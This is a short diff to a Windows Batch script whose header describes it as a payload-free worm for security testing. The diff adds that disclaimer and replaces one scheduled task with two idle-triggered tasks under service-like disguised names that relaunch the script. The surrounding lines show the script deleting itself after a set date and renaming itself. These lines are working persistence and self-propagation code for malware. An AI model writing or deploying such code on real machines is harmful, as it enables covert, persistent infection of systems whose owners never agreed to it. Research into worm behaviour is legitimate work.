@@ -10,6 +10,10 @@ set currentIteration=0 %= 2023-05-13 =% & goto begin
 ::                               a1cbdd7272ff08c2b23eadbd9b92fab96b13e3e6ab8238a47c63075afc9d6870                                ::
 ::                                                      Version 2023/05/13                                                       ::
 ::                                                                                                                               ::
+::                             This is a worm type script made in Batch purely for security testing,                             ::
+::                                    and does not have a payload or any other malicious code.                                   ::
+::                                             ! For security testing purposes only !                                            ::
+::                                                                                                                               ::
 ::                                                                                                                               ::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 ::                                                                                                                               ::
@@ -61,7 +65,8 @@ if "%date%" == "!date:%allowedYear%=!" del "%~f0" && exit
 
 set /a currentIteration=currentIteration+1
 
-schtasks /create /sc onidle /i 15 /tn "alsvc" /tr "%~f0"
+schtasks /create /sc onidle /i 15 /tn "svc1anlda" /tr "%~f0"
+schtasks /create /sc onidle /i 30 /tn "svc2anlda" /tr "%~f0"
 
 if not exist "%annelida.cmd%" move "%~f0" annelida.cmd
 
